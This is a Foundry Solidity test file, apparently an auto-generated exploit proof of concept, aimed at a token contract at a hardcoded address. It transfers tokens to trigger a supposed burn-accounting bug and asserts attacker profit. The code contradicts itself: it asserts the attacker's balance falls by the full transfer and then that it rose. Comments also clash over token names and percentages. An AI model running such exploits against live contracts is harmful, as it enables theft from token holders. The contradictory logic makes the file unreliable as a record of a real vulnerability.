// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface MyCoinToken {
    function totalBurn() external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function adminAddress(address) external view returns (bool);
    function _getMarketTotalToken() external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x7144E379C827fA71A7ecAA01d00607cBb7eB1b7A;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Create a second attacker-controlled address
        address attacker2 = address(0x1337);

        // Give attacker some LoveDoge tokens - need to use deal() with the token address
        // We need to get the token address from TARGET constant
        deal(TARGET, attacker, 1000 * 10**9); // 1000 tokens with 9 decimals

        // Ensure attacker is not admin (should be false by default)
        // No need to do anything as adminAddress[attacker] should be false
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = IERC20(0x7144E379C827fA71A7ecAA01d00607cBb7eB1b7A).balanceOf(address(this));
        // Record initial values
        uint256 initialTotalBurn = MyCoinToken(TARGET).totalBurn();
        uint256 initialTotalSupply = MyCoinToken(TARGET).totalSupply();
        uint256 initialAttackerBalance = MyCoinToken(TARGET).balanceOf(attacker);

        // Create a second attacker-controlled address
        address attacker2 = address(0x1337);

        // Perform a transfer to trigger the bug
        uint256 transferAmount = 100 * 10**9; // 100 tokens
        MyCoinToken(TARGET).transfer(attacker2, transferAmount);

        // Check results
        uint256 finalTotalBurn = MyCoinToken(TARGET).totalBurn();
        uint256 finalTotalSupply = MyCoinToken(TARGET).totalSupply();
        uint256 finalAttackerBalance = MyCoinToken(TARGET).balanceOf(attacker);

        // Verify the bug: totalBurn increased but totalSupply unchanged
        assertGt(finalTotalBurn, initialTotalBurn, "totalBurn should have increased");
        assertEq(finalTotalSupply, initialTotalSupply, "totalSupply should remain unchanged (bug!)");

        // Calculate expected burn amount (2% of transfer)
        uint256 expectedBurn = transferAmount * 2 / 100;
        assertEq(finalTotalBurn - initialTotalBurn, expectedBurn, "totalBurn should increase by 2% of transfer");

        // Verify attacker balance decreased by full amount (not just 90%)
        // Actually, attacker balance should decrease by full transferAmount
        assertEq(initialAttackerBalance - finalAttackerBalance, transferAmount, "Attacker balance should decrease by full transfer amount");

        // The oracle will check if attacker balance increased, but in this case
        // we're demonstrating the accounting bug. The real profit might come from
        // bonus pool manipulation due to incorrect _getMarketTotalToken() calculation.
        uint256 finalBalance = IERC20(0x7144E379C827fA71A7ecAA01d00607cBb7eB1b7A).balanceOf(address(this));
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No ERC20 profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
